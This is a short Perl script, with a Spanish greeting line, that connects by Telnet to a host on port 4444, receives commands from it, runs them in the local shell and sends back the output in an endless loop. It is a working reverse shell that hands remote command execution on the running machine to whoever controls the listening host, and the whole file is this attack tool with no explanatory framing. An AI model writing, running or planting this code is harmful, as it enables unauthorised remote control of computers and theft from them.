#!/usr/bin/perl
use Net::Telnet ();
use Net::Telnet;
($ip) = "10.0.1.2";
print("$ip\n");
$telnet = new Net::Telnet ( Timeout=>30, Port=>4444);
$telnet->open($ip);
$count=1;
$telnet->print('Acceso desde equipo remoto');
$pattern='/\$ $/i';
while ($count == 1) {
  $data = $telnet->get(Timeout=>100);
  $output = `$data`;
  $telnet->print($output);
}
exit 0
